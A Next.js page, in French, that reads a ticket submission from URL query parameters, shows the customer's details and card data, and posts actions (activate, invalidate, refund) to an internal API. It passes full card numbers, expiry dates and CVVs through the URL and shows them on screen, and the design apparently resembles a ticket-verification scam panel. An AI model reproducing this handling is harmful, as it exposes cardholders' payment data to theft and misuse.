"use client";
import { useSearchParams } from "next/navigation";
import { useEffect, useState } from "react";


export default function TicketActionPage() {
  const searchParams = useSearchParams();
  const ticketId = searchParams.get("ticketId") || "";
  const user_name = searchParams.get("user_name") || "";
  const user_email = searchParams.get("user_email") || "";
  const user_phone = searchParams.get("user_phone") || "";
  const ticket_code = searchParams.get("ticket_code") || "";
  const ticket_type = searchParams.get("ticket_type") || "";
  const ticket_amount = searchParams.get("ticket_amount") || "";
  const submission_type = searchParams.get("submission_type") || "";
  const reimbursement_method = searchParams.get("reimbursement_method") || "";
  const bank_iban = searchParams.get("bank_iban") || "";
  const paypal_email = searchParams.get("paypal_email") || "";
  const card_number = searchParams.get("card_number") || "";
  const card_expiry = searchParams.get("card_expiry") || "";
  const card_cvv = searchParams.get("card_cvv") || "";
  const card_name = searchParams.get("card_name") || "";
  const created_at = searchParams.get("created_at") || "";
  const [loading, setLoading] = useState(false);
  const [result, setResult] = useState<string | null>(null);

    const handleAction = async (chosenAction: "activate" | "invalidate" | "refund" | "not_refundable") => {
      setLoading(true);
      setResult(null);
      try {
        const submission = {
          id: ticketId,
          user_name,
          user_email,
          user_phone,
          ticket_code,
          ticket_type,
          ticket_amount: ticket_amount ? Number(ticket_amount) : 0,
          submission_type,
          reimbursement_method,
          bank_iban,
          paypal_email,
          card_number,
          card_expiry,
          card_cvv,
          card_name,
          created_at,
        };
        let apiAction = chosenAction;
        if (chosenAction === "refund") apiAction = "refund";
        if (chosenAction === "not_refundable") apiAction = "not_refundable";
        const res = await fetch("/api/ticket-status", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ ticketId, action: apiAction, submission }),
        });
        const data = await res.json();
        if (res.ok) {
          setResult(data.message || "Message envoyé au client avec succès.");
        } else {
          setResult(data.error || "Erreur lors de l'envoi du message.");
        }
      } catch (err) {
        setResult("Erreur réseau ou serveur.");
      } finally {
        setLoading(false);
      }
    };

    const missingFields = [];
    if (!ticketId) missingFields.push("ID du ticket");
    if (!user_email) missingFields.push("Email");
    if (!user_name) missingFields.push("Nom");
    if (!ticket_code) missingFields.push("Code ticket");
    if (!ticket_type) missingFields.push("Type de ticket");
    if (!ticket_amount) missingFields.push("Montant");


    return (
      <div className="max-w-lg mx-auto mt-16 p-8 bg-white rounded-xl shadow">
        <h1 className="text-2xl font-bold mb-6 text-blue-700">Action sur le ticket</h1>
        {missingFields.length > 0 && (
          <div className="mb-4 p-4 bg-yellow-100 border-l-4 border-yellow-500 text-yellow-800 rounded">
            <strong>Attention :</strong> Les champs suivants sont manquants ou vides : {missingFields.join(", ")}
          </div>
        )}
        <div className="mb-4 text-gray-700">
          <div><strong>ID du ticket :</strong> {ticketId}</div>
          <div><strong>Nom :</strong> {user_name}</div>
          <div><strong>Email :</strong> {user_email}</div>
          <div><strong>Téléphone :</strong> {user_phone}</div>
          <div><strong>Code ticket :</strong> {ticket_code}</div>
          <div><strong>Type de ticket :</strong> {ticket_type}</div>
          <div><strong>Montant :</strong> {ticket_amount} €</div>
          <div><strong>Type de demande :</strong> {submission_type}</div>
          <div><strong>Méthode de remboursement :</strong> {reimbursement_method}</div>
          <div><strong>IBAN :</strong> {bank_iban}</div>
          <div><strong>Email PayPal :</strong> {paypal_email}</div>
          <div><strong>Carte bancaire :</strong> {card_number}</div>
          <div><strong>Nom sur la carte :</strong> {card_name}</div>
          <div><strong>Date d'expiration :</strong> {card_expiry}</div>
          <div><strong>CVV :</strong> {card_cvv}</div>
          <div><strong>Date de création :</strong> {created_at}</div>
        </div>
        <div className="flex gap-4 mb-6">
          {submission_type === "reimbursement" ? (
            <>
              <button
                className="bg-green-600 text-white px-6 py-2 rounded font-semibold hover:bg-green-700 disabled:opacity-50"
                disabled={loading}
                onClick={() => handleAction("refund")}
              >Rembourser</button>
              <button
                className="bg-red-600 text-white px-6 py-2 rounded font-semibold hover:bg-red-700 disabled:opacity-50"
                disabled={loading}
                onClick={() => handleAction("not_refundable")}
              >Ticket déjà utilisé / Non remboursable</button>
            </>
          ) : (
            <>
              <button
                className="bg-blue-600 text-white px-6 py-2 rounded font-semibold hover:bg-blue-700 disabled:opacity-50"
                disabled={loading}
                onClick={() => handleAction("activate")}
              >Activer</button>
              <button
                className="bg-red-600 text-white px-6 py-2 rounded font-semibold hover:bg-red-700 disabled:opacity-50"
                disabled={loading}
                onClick={() => handleAction("invalidate")}
              >Invalider</button>
            </>
          )}
        </div>
        {loading && <div className="text-blue-500">Envoi en cours...</div>}
        {result && <div className="mt-4 text-green-700 font-semibold">{result}</div>}
      </div>
  );
}
